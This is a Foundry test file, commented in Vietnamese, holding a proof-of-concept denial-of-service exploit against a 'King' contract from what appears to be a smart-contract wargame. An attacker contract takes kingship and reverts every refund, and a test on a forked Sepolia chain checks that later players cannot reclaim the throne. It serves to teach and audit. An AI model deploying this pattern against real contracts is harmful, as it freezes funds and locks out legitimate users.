// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Interface để file test tương tác với bài King
interface IKing {
    function prize() external view returns (uint256);
    function _king() external view returns (address);
}

// 1. CONTRACT TẤN CÔNG (Bắt buộc phải dùng contract để ép DoS)
contract KingAttacker {
    // Hàm gọi để cướp ngôi vua
    function claimKingship(address payable target) external payable {
        // Sử dụng cấu trúc thấp cấp .call để gửi kèm toàn bộ lượng Ether nhận được
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "Attack transaction failed");
    }

    // ĐIỂM CHẤT NGƯỜI: Cố tình chặn không nhận bất kỳ dòng tiền Ether nào trả về.
    // Khi hợp đồng King gọi payable(king).transfer(msg.value), giao dịch gửi tiền tới đây sẽ lập tức bị REVERT!
    receive() external payable {
        revert("Denial of Service: I refuse to be overthrown!");
    }
}

// 2. KỊCH BẢN KHAI THÁC PHÒNG THÍ NGHIỆM (Foundry Test PoC)
contract KingExploitTest is Test {
    IKing public kingContract;
    KingAttacker public attackerContract;

    // Thiết lập môi trường Forking mạng Sepolia từ biến môi trường
    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);

        // Thay địa chỉ Instance thực tế trên Sepolia của ông vào đây
        kingContract = IKing(0x1234567890123456789012345678901234567890);
        
        // Khởi tạo hợp đồng tấn công độc hại
        attackerContract = new KingAttacker();
    }

    function test_DenialOfServiceAttack() public {
        // Lấy giá trị tiền thưởng tối thiểu cần có để cướp ngôi hiện tại
        uint256 currentPrize = kingContract.prize();

        // Tiến hành gửi lượng Ether lớn hơn hoặc bằng giá trị prize thông qua contract tấn công
        attackerContract.claimKingship{value: currentPrize}(payable(address(kingContract)));

        // Kiểm tra xem vị vua hiện tại đã đổi chủ sang contract tấn công chưa
        assertEq(kingContract._king(), address(attackerContract), "Attack fail: Attacker is not the current king");

        // CHỨNG MINH DOS THÀNH CÔNG: Giả lập một người chơi hợp lệ khác (User B) cố gắng cướp lại ngôi vua
        address userB = address(0xABC);
        vm.deal(userB, 10 ether); // Cấp vốn cho User B

        // User B gửi hẳn 5 Ether (lớn hơn rất nhiều so với prize hiện tại)
        vm.startPrank(userB);
        
        // Foundry cheatcode expectRevert dùng để khẳng định giao dịch tiếp theo BUỘC PHẢI THẤT BẠI
        vm.expectRevert();
        (bool success, ) = address(kingContract).call{value: 5 ether}("");
        
        vm.stopPrank();

        // Nếu lệnh call của User B bị revert (giao dịch thất bại), nghĩa là hệ thống đã bị đóng băng thành công!
        emit log("Audit Verification: DoS Attack is verified successfully. King cannot be overthrown.");
    }
}